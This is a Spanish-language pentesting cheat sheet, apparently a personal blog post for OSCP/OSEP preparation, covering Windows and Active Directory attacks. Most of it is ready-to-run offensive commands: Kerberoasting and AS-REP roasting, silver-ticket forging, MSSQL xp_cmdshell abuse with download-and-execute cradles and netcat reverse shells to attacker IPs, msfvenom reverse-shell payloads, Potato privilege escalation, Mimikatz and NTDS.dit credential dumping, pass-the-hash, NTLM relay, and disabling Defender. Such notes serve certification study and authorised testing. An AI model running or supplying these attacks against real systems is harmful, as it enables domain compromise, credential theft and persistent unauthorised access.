---
title: "Windows Pentesting y Active Directory - Gu√≠a Completa"
date: Sun Dec 08 2025 00:00:00 GMT+0100 (Central European Standard Time)
categories: [Apuntes, Windows]
tags: [windows, active-directory, kerberos, mimikatz, bloodhound, privesc, oscp, osep, apuntes, pentesting]
image: /assets/img/cabeceras/2025-12-08-windows-pentesting.png
---

# Windows Pentesting y Active Directory - Gu√≠a Completa

## üñ•Ô∏è Enumeraci√≥n de Windows

### Informaci√≥n B√°sica del Sistema

```powershell
# Informaci√≥n completa del sistema
systeminfo

# Nombre del equipo
hostname

# Usuario actual
whoami
echo %username%

# Privilegios del usuario actual
whoami /priv

# Toda la informaci√≥n del token
whoami /all

# Informaci√≥n espec√≠fica de un usuario
net user usuario
net user usuario /domain
```

**üí° Si `systeminfo` devuelve "Access is Denied"**:
```powershell
# Consultar directamente el registro
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName

# Build number
reg query "hklm\software\microsoft\windows nt\currentversion" /v CurrentBuild
```

### Enumeraci√≥n de Usuarios y Grupos

```powershell
# Listar usuarios locales
net users
net localgroup

# Listar miembros de Administradores
net localgroup administrators

# Con PowerShell (m√°s detallado)
Get-LocalGroupMember administrators

# Usuarios del dominio
net user /domain
net group /domain

# Grupos del dominio
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
```

### Informaci√≥n de Red

```powershell
# Configuraci√≥n de red completa
ipconfig /all

# Tabla de enrutamiento
route print

# Cach√© ARP (descubrir otros hosts)
arp -A

# Conexiones activas y puertos en escucha
netstat -ano

# Estado del firewall
netsh firewall show state
netsh firewall show config

# Alternativa moderna
netsh advfirewall show allprofiles
```

### Enumeraci√≥n de Servicios y Procesos

```powershell
# Listar todos los procesos
tasklist /v

# Con PowerShell
Get-Process

# Listar servicios en ejecuci√≥n
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Servicios con inicio autom√°tico
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.StartMode -like 'Auto'}

# Buscar servicio espec√≠fico
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

# Proceso escuchando en puerto espec√≠fico
Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
```

### Enumeraci√≥n de Software Instalado

```powershell
# Programas desinstalables (x64)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Programas instalados (x86)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### Historial de PowerShell

```powershell
# Leer historial de comandos de PowerShell
Get-Content (Get-PSReadlineOption).HistorySavePath

# Alternativa manual
Get-Content C:\Users\usuario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt

# Buscar archivo de historial en todo el sistema
Get-ChildItem -Path C:\ -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Filter ServerRemoteHost_history.txt -Recurse -ErrorAction SilentlyContinue -Force
```

### Enumeraci√≥n SPN (Service Principal Names)

```powershell
# Extraer cuentas y nombres en el SPN
setspn.exe -T medin -Q */*
setspn.exe -F -Q */*
setspn.exe -Q */@contoso.com
```

**üéØ ¬øPor qu√© es importante?** Los SPNs est√°n asociados a cuentas de servicio, que pueden ser vulnerables a Kerberoasting.

---

## üè∞ Active Directory

### Conceptos Fundamentales

**Active Directory (AD)** es el servicio de directorio de Microsoft usado en la mayor√≠a de entornos empresariales. Componentes clave:

- **Domain Controller (DC)**: Servidor que gestiona el dominio
- **Forest**: Colecci√≥n de uno o m√°s dominios
- **Trust**: Relaci√≥n de confianza entre dominios
- **OU (Organizational Unit)**: Contenedor para organizar objetos
- **GPO (Group Policy Object)**: Pol√≠ticas aplicadas a usuarios/equipos

### Enumeraci√≥n con PowerView

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Informaci√≥n del dominio
Get-NetDomain

# Controladores de dominio
Get-NetDomainController

# Listar todos los usuarios
Get-NetUser | select samaccountname, description

# Buscar usuarios con SPN (Kerberoastable)
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# Listar grupos
Get-NetGroup | select samaccountname

# Miembros de Domain Admins
Get-NetGroupMember "Domain Admins"

# Equipos del dominio
Get-NetComputer | select name, operatingsystem

# Buscar shares
Invoke-ShareFinder

# Buscar archivos interesantes en shares
Invoke-FileFinder
```

### Enumeraci√≥n con BloodHound

**BloodHound** es LA herramienta para mapear rutas de ataque en AD.

#### Recolecci√≥n de datos desde m√°quina comprometida

```powershell
# Subir SharpHound.ps1 a la m√°quina objetivo
Import-Module .\SharpHound.ps1

# Recolectar toda la informaci√≥n
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\ -OutputPrefix "audit"

# Solo usuarios y sesiones (m√°s r√°pido)
Invoke-BloodHound -CollectionMethod UserSessions,SessionLoop -OutputDirectory C:\Temp\
```

#### Recolecci√≥n remota (desde Kali)

```bash
# Con bloodhound-python
bloodhound-python -c all -u 'user' -p 'password' -ns 10.10.10.200 -d domain.local

# Con netexec (antes crackmapexec)
netexec ldap DC01.domain.local -u user -p password --bloodhound --collection All --dns-tcp --dns-server 10.10.10.200
```

#### Iniciar BloodHound

```bash
# Iniciar base de datos Neo4j
sudo neo4j console

# En otra terminal, iniciar BloodHound
bloodhound

# Credenciales por defecto:
# Usuario: neo4j
# Password: neo4j (cambiar en primer inicio)
```

**Consultas √∫tiles en BloodHound**:
- "Find Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- "Shortest Path from Owned Principals"
- "Find Kerberoastable Users"
- "Users with Foreign Domain Group Membership"

---

## üé´ Kerberos Attacks

### ¬øQu√© es Kerberos?

**Kerberos** es el protocolo de autenticaci√≥n de Active Directory. Usa tickets para autenticar usuarios sin enviar contrase√±as por la red.

**Componentes principales**:
- **KDC (Key Distribution Center)**: Servicio en el DC
- **TGT (Ticket Granting Ticket)**: Ticket inicial del usuario
- **TGS (Ticket Granting Service)**: Ticket para acceder a un servicio espec√≠fico
- **PAC (Privilege Attribute Certificate)**: Informaci√≥n de autorizaci√≥n

### ASREPRoasting (Sin autenticaci√≥n)

**¬øQu√© es?** Usuarios con `UF_DONT_REQUIRE_PREAUTH` habilitado no requieren pre-autenticaci√≥n Kerberos, permiti√©ndonos solicitar un TGT sin contrase√±a.

#### Enumeraci√≥n y explotaci√≥n

```bash
# Enumerar usuarios vulnerables (sin autenticaci√≥n)
impacket-GetNPUsers domain.local/ -no-pass -usersfile valid_users.txt

# Con credenciales (m√°s efectivo)
impacket-GetNPUsers domain.local/user:password -request

# Solo con usuario (pedir√° contrase√±a)
impacket-GetNPUsers domain.local/user

# Ejemplo de salida:
# $krb5asrep$23$usuario@DOMAIN.LOCAL:hash_aqui...
```

#### Crackear hash obtenido

```bash
# Con John the Ripper
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Con Hashcat
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**üéØ MITRE ATT&CK**: T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting

### Kerberoasting (Requiere autenticaci√≥n)

**¬øQu√© es?** Cuentas de servicio tienen SPNs registrados. Podemos solicitar TGS para estos servicios y crackear offline.

```bash
# Solicitar TGS de todas las cuentas con SPN
impacket-GetUserSPNs 'domain.local/usuario:password' -request

# Guardar en archivo
impacket-GetUserSPNs 'domain.local/usuario:password' -request -outputfile kerberoast.txt

# Con Kerberos (si NTLM est√° deshabilitado)
impacket-GetUserSPNs 'domain.local/usuario:password' -k -dc-ip dc1.domain.local -request

# Nota: Agregar 'dc1.domain.local' a /etc/hosts primero
```

**‚ö†Ô∏è Fix para error "Exceptions must derive from BaseException"**:

Editar `/usr/share/doc/python3-impacket/examples/GetUserSPNs.py` l√≠nea 260:
```python
# Cambiar:
target = self.getMachineName()
# Por:
target = self.__kdcHost
```

#### Crackear TGS obtenido

```bash
# Con John the Ripper
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt

# Listar formatos disponibles
john --list-formats | grep krb

# Con Hashcat
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

**üéØ MITRE ATT&CK**: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

### Pass-the-Ticket (PTT)

```bash
# Solicitar TGT con credenciales
impacket-getTGT domain.local/user:password

# Resultado: user.ccache

# Exportar ticket a variable de entorno
export KRB5CCNAME=user.ccache

# Usar ticket para autenticarse
impacket-mssqlclient dc1.domain.local -k
impacket-psexec dc1.domain.local -k
```

### Silver Ticket (Service Account Compromise)

**Requisitos**:
- Hash NTLM de cuenta de servicio
- SPN del servicio
- Domain SID
- Nombre de usuario objetivo (ej: Administrator)

```bash
# Obtener Domain SID
impacket-getPac domain.local/user:password -targetUser Administrator

# O con script especializado
SIDKerberos.py domain.local/user -k -no-pass -dc-ip 10.10.11.168 -dc-host dc1.domain.local -all

# Obtener SPN
impacket-GetUserSPNs domain.local/user:password

# Generar hash NTLM de contrase√±a (si tenemos contrase√±a)
# Usar: https://codebeautify.org/ntlm-hash-generator
# O: echo -n 'Password123!' | iconv -t utf16le | openssl md4

# Crear Silver Ticket
impacket-ticketer -spn MSSQLSvc/dc1.domain.local \
  -domain-sid S-1-5-21-2356742346-1246457893-5930582943 \
  -dc-ip dc1.domain.local \
  -nthash b999a16500b87d17ec7f2e2a68778f05 \
  Administrator \
  -domain domain.local

# Resultado: Administrator.ccache

# Exportar y usar
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient dc1.domain.local -k
```

**üéØ MITRE ATT&CK**: T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket

### Sincronizaci√≥n de Reloj (Cr√≠tico para Kerberos)

```bash
# Kerberos requiere sincronizaci√≥n de tiempo (max 5 min diferencia)
sudo ntpdate -u domain.local

# Si ntpdate no funciona, usar ntpsec
sudo systemctl start ntpsec
sudo ntpdate -u domain.local
```

**Configurar servidores NTP confiables** en `/etc/ntpsec/ntp.conf`:
```
pool ntp.api.bz iburst
pool asia.pool.ntp.org iburst
pool time.nist.gov iburst
pool time.windows.com iburst
```

### Enumeraci√≥n con Kerbrute

```bash
# Enumerar usuarios v√°lidos (sin autenticaci√≥n)
kerbrute userenum --dc 10.10.10.200 -d domain.local /usr/share/seclists/Usernames/Names/names.txt

# Wordlists recomendadas
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/kerberos_enum_userlists/A-ZSurnames.txt

# Guardar usuarios v√°lidos
kerbrute userenum --dc 10.10.10.200 -d domain.local jsmith.txt -o valid_ad_users.txt

# Password spraying (cuidado con bloqueos de cuenta)
kerbrute bruteuser --dc 10.10.10.200 -d domain.local passwords.txt usuario
```

**‚ö†Ô∏è Cuidado**: Password spraying puede bloquear cuentas. Verificar pol√≠tica de bloqueo primero.

---

## üóÑÔ∏è MS SQL Server

### Conexi√≥n a MSSQL

```bash
# Con impacket-mssqlclient
impacket-mssqlclient -p 49700 user@HOST -windows-auth

# Con usuario y contrase√±a
impacket-mssqlclient user:password@10.13.38.11

# Con Kerberos
impacket-mssqlclient dc1.domain.local -k
```

### Enumeraci√≥n de Base de Datos

```sql
# Listar logins
SELECT name FROM master..syslogins;

# Logins con permisos de sysadmin
SELECT name FROM master..syslogins WHERE sysadmin = '1';

# Permisos del usuario actual
SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');

# Listar bases de datos
SELECT name FROM master.sys.databases;

# Seleccionar base de datos
USE nombre_base_datos;

# Listar tablas
SELECT * FROM nombre_base_datos.information_schema.tables;
SELECT table_name,table_schema FROM nombre_base_datos.information_schema.tables;

# Mostrar datos de tabla
SELECT * FROM tabla;
```

### Habilitar xp_cmdshell

```sql
# Verificar si est√° habilitado
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# Habilitar (forma larga)
SP_CONFIGURE "show advanced options", 1
RECONFIGURE
SP_CONFIGURE "xp_cmdshell", 1
RECONFIGURE

# Forma corta
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Si hay triggers de seguridad bloqueando xp_cmdshell**:

```sql
# Listar triggers activos
select name from sys.server_triggers;

# Deshabilitar trigger
disable trigger ALERT_xp_cmdshell on all server
```

### Ejecuci√≥n de Comandos

```sql
# Ejecutar comando
EXEC master..xp_cmdshell 'whoami'

# Listar directorios
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;

# Ver archivos de un directorio
EXEC xp_cmdshell 'dir C:\inetpub\wwwroot'
```

### Obtener Hash NTLM con Responder

```bash
# En Kali, iniciar Responder
sudo responder -I tun0

# En MSSQL, hacer que conecte a nuestro SMB
EXEC xp_dirtree '\\10.10.16.30\share', 1, 1;

# Resultado: Capturamos hash NetNTLMv2
```

### Reverse Shell desde MSSQL

```sql
# Descargar y ejecutar script PowerShell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# O usando bitsadmin
EXEC xp_cmdshell 'bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.13:8000/nc.exe C:\Temp\nc.exe'
EXEC xp_cmdshell 'C:\Temp\nc.exe -e cmd.exe 10.10.14.13 443'
```

### Bypass Blacklist de "EXEC xp_cmdshell"

```sql
# Si "EXEC xp_cmdshell" est√° en blacklist
DECLARE @x AS VARCHAR(100)='xp_cmdshell';
EXEC @x 'ping 10.10.14.13';
```

### Ejecutar Scripts Python/R

```sql
# Ejecutar c√≥digo Python
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';

# Leer archivo
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type C:\inetpub\wwwroot\web.config");';

# Conexiones de red
EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("netstat -ano");';
```

### Linked Servers (Pivoting SQL)

```sql
# Ver nombre del servidor actual
select @@servername

# Listar servidores vinculados
select srvname from sysservers;

# Ejemplo de salida:
# COMPATIBILITY\POO_CONFIG
# COMPATIBILITY\POO_PUBLIC

# Ejecutar query en servidor vinculado
EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];

# Ver usuario con el que nos conectamos
EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];

# Ver permisos
EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG];

# Doble salto (servidor -> servidor -> servidor)
EXEC ('EXEC (''select @@servername;'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```

#### Crear usuario admin en linked server

```sql
# Crear login
EXECUTE('EXECUTE(''CREATE LOGIN df WITH PASSWORD = ''''qwe123QWE!@#'''';'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]

# Agregar a sysadmin
EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''df'''', ''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]

# Conectar con nuevo usuario
mssqlclient.py 'df:qwe123QWE!@#@10.13.38.11'
```

**üéØ MITRE ATT&CK**: T1210 - Exploitation of Remote Services

---

## üîê Escalada de Privilegios

### PowerUp.ps1 (Enumeraci√≥n automatizada)

```powershell
# Descargar desde
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

# Ejecutar remotamente sin tocar disco
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.33:8000/PowerUp.ps1')

# O importar localmente
Import-Module .\PowerUp.ps1

# Ejecutar todos los checks
Invoke-AllChecks

# Buscar servicios modificables
Get-ModifiableServiceFile

# Buscar DLL hijacking
Find-ProcessDLLHijack

# Buscar AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated
```

### Servicios Vulnerables

#### Servicio con permisos de escritura en binario

```powershell
# Identificar con PowerUp
Get-ModifiableServiceFile

# O manualmente
icacls "C:\Program Files\VulnService\service.exe"

# Si tenemos permisos de escritura (W), reemplazar con payload
# Crear payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=443 -f exe > service.exe

# Subir y reemplazar
copy service.exe "C:\Program Files\VulnService\service.exe"

# Reiniciar servicio
sc stop VulnService
sc start VulnService
```

#### Unquoted Service Path

```powershell
# Buscar servicios con rutas sin comillas
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Ejemplo vulnerable:
# C:\Program Files\Vulnerable App\service.exe

# Windows buscar√° en orden:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe
# C:\Program Files\Vulnerable App\service.exe

# Si tenemos permisos de escritura en alg√∫n directorio, colocar payload
copy payload.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnService
sc start VulnService
```

### SeImpersonatePrivilege (Potato Exploits)

```powershell
# Verificar privilegios
whoami /priv

# Si tienes SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege
```

**Variantes de Potato**:

#### JuicyPotatoNG

```powershell
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 192.168.230.12 443"
```

#### GodPotato

```powershell
.\GodPotato.exe -cmd ".\nc.exe -t -e c:\windows\system32\cmd.exe 192.168.230.12 443"
```

#### PrintSpoofer

```powershell
.\PrintSpoofer64.exe -c "cmd /c powershell -c C:\Temp\reverse.ps1"
```

**üéØ MITRE ATT&CK**: T1134.001 - Access Token Manipulation: Token Impersonation/Theft

### AlwaysInstallElevated

```powershell
# Verificar si est√° habilitado
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si ambos est√°n en 0x1, podemos instalar MSI como SYSTEM

# Crear MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=443 -f msi > installer.msi

# Instalar
msiexec /quiet /qn /i C:\Temp\installer.msi
```

---

## üíÄ Post-Explotaci√≥n

### Mimikatz (Extracci√≥n de Credenciales)

```powershell
# Habilitar debug privilege
mimikatz # privilege::debug

# Extraer credenciales de LSASS
mimikatz # sekurlsa::logonpasswords

# Extraer hashes de SAM (requiere SYSTEM)
mimikatz # token::elevate
mimikatz # lsadump::sam

# Extraer de LSA (Domain Controller)
mimikatz # token::elevate
mimikatz # lsadump::lsa /patch

# Oneliners
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
.\mimikatz "privilege::debug" "token::elevate" "lsadump::sam" exit
.\mimikatz "privilege::debug" "token::elevate" "lsadump::lsa /patch" exit
```

**üéØ MITRE ATT&CK**: T1003.001 - OS Credential Dumping: LSASS Memory

### Dump SAM y SYSTEM (Workstations/Servers)

```powershell
# Guardar SAM y SYSTEM del registro
reg save HKLM\system C:\Temp\SYSTEM
reg save HKLM\sam C:\Temp\SAM

# Descargar a Kali y extraer hashes
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```

### Dump NTDS.dit (Domain Controllers)

#### M√©todo 1: Shadow Copy

Crear archivo `shadowcopy.txt` (a√±adir espacio al final de cada l√≠nea):
```
set context persistent nowriters
add volume c: alias andyshadow
create
expose %andyshadow% z:
```

Ejecutar:
```powershell
# Crear shadow copy
diskshadow.exe /s C:\Temp\shadowcopy.txt

# Resultado: The shadow copy was successfully exposed as Z:\.

# Copiar NTDS.dit
robocopy /b Z:\Windows\NTDS\ . ntds.dit

# Opcional: Comprimir antes de exfiltrar
Compress-Archive -Path .\ntds.dit -DestinationPath .\ntds.zip

# Descargar a Kali y extraer
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

#### M√©todo 2: VSS con ntdsutil

```powershell
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q
```

**üéØ MITRE ATT&CK**: T1003.003 - OS Credential Dumping: NTDS

### Pypykatz (Alternativa a Mimikatz en Python)

```bash
# Procesar dump de LSASS
pypykatz lsa minidump lsass.dmp
```

---

## üåê Movimiento Lateral

### NTLM Relay Attack

```bash
# Iniciar ntlmrelayx
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."

# Forzar autenticaci√≥n desde v√≠ctima con Responder
sudo responder -I tun0
```

**Requisitos**:
- SMB signing deshabilitado en target
- Credenciales capturadas deben tener permisos en target

### Pass-the-Hash con CrackMapExec

```bash
# Ejecutar comando
crackmapexec smb 10.10.10.200 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:7574cbf9d92c39d1d4dccd7b89301d2f' -x 'whoami'

# Habilitar RDP
crackmapexec smb 10.9.20.13 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:7574cbf9d92c39d1d4dccd7b89301d2f' -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
```

### Pass-the-Hash con impacket-psexec

```bash
# Shell con hash NTLM
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7574cbf9d92c39d1d4dccd7b89301d2f administrator@10.10.10.200

# Con credenciales
impacket-psexec domain/user:password@10.10.10.200
```

### Pass-the-Hash con RDP

```bash
# Habilitar Restricted Admin Mode primero
crackmapexec smb 10.10.10.200 -u admin -H hash -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

# Conectar con hash
xfreerdp /u:administrator /pth:7574cbf9d92c39d1d4dccd7b89301d2f /v:10.10.10.200
```

**üéØ MITRE ATT&CK**: T1550.002 - Use Alternate Authentication Material: Pass the Hash

### Cambiar Contrase√±a de Usuario Remoto

```bash
# Cambiar password de otro usuario (requiere permisos)
net rpc password 'user_to_change' -U 'my_user' -S 10.10.10.200

# Pedir√° nueva contrase√±a
```

### Capturar Hashes con NTLM_Theft

```bash
# Generar archivos maliciosos que capturan hashes cuando se abren
python ntlm_theft.py -g all -s 10.10.14.50 -f malicious_file

# Iniciar Responder
sudo responder -I tun0 -wA

# Cuando v√≠ctima abra el archivo, capturamos su hash NetNTLMv2
```

---

## üé≠ Evasi√≥n y OpSec

### Bypass de PowerShell Execution Policy

```powershell
# Bypass de pol√≠tica de ejecuci√≥n
powershell -ep bypass

# Ejecutar script sin tocar disco
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.50/script.ps1')"
```

### Deshabilitar Windows Defender

```powershell
# Requiere Administrator
Set-MpPreference -DisableRealtimeMonitoring $true

# Verificar estado
Get-MpPreference | select DisableRealtimeMonitoring
```

### Forzar Pwned (Local Account Token Filter Policy)

```powershell
# Habilitar Pass-the-Hash con cuentas locales
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

M√°s info: [LocalAccountTokenFilterPolicy](https://deephacking.tech/localaccounttokenfilterpolicy-windows/)

### Habilitar RDP Remotamente

```powershell
# Con PowerShell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Con CMD
sc config RemoteRegistry start= auto
net start remoteregistry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

---

## üõ†Ô∏è Herramientas Imprescindibles

### Suite de Herramientas

| Herramienta | Uso Principal |
|-------------|---------------|
| **BloodHound** | Mapeo de rutas de ataque en AD |
| **Mimikatz** | Extracci√≥n de credenciales |
| **CrackMapExec** | Enumeraci√≥n y explotaci√≥n SMB/AD |
| **Responder** | Captura de hashes NTLM |
| **Impacket** | Suite de herramientas para protocolos Windows |
| **PowerView** | Enumeraci√≥n de AD desde PowerShell |
| **Rubeus** | Abuso de Kerberos desde Windows |
| **SharpHound** | Recolector de datos para BloodHound |

---

## üéì Tips para OSCP/OSEP

### Checklist de Enumeraci√≥n Windows

- [ ] Informaci√≥n de sistema y usuario (`systeminfo`, `whoami /all`)
- [ ] Usuarios y grupos locales (`net users`, `net localgroup`)
- [ ] Servicios en ejecuci√≥n (`Get-CimInstance win32_service`)
- [ ] Procesos activos (`tasklist`, `Get-Process`)
- [ ] Conexiones de red (`netstat -ano`)
- [ ] Software instalado (registro)
- [ ] Historial de PowerShell
- [ ] Archivos interesantes (Desktop, Documents, Downloads)
- [ ] Credenciales en archivos de configuraci√≥n

### Checklist de Active Directory

- [ ] Enumerar usuarios con BloodHound/PowerView
- [ ] Buscar usuarios Kerberoastable
- [ ] Buscar usuarios ASREPRoastable
- [ ] Verificar permisos de objetos (ACLs)
- [ ] Buscar GPOs interesantes
- [ ] Revisar shares de red
- [ ] Buscar contrase√±as en descripci√≥n de usuarios
- [ ] Verificar trusts de dominio

### Comandos R√°pidos para Examen

```bash
# Enumeraci√≥n r√°pida de AD
bloodhound-python -c all -u user -p pass -ns 10.10.10.10 -d domain.local

# Kerberoasting
impacket-GetUserSPNs domain.local/user:pass -request -outputfile hashes.txt

# Pass-the-Hash
crackmapexec smb 10.10.10.0/24 -u admin -H hash --continue-on-success
```

---

## üìö Referencias

### Frameworks y Metodolog√≠as
- [MITRE ATT&CK - Windows](https://attack.mitre.org/matrices/enterprise/windows/)
- [Red Team Notes - Windows](https://www.ired.team/)
- [WADComs](https://wadcoms.github.io/) - Cheatsheet interactivo AD

### Herramientas
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Impacket](https://github.com/fortra/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

### Documentaci√≥n
- [Active Directory Security](https://adsecurity.org/)
- [Harmj0y Blog](https://blog.harmj0y.net/)
- [SpecterOps Blog](https://posts.specterops.io/)

---

**√öltima actualizaci√≥n**: 2025-01-10
**Autor**: alorente
**Licencia**: Creative Commons BY-NC-SA 4.0
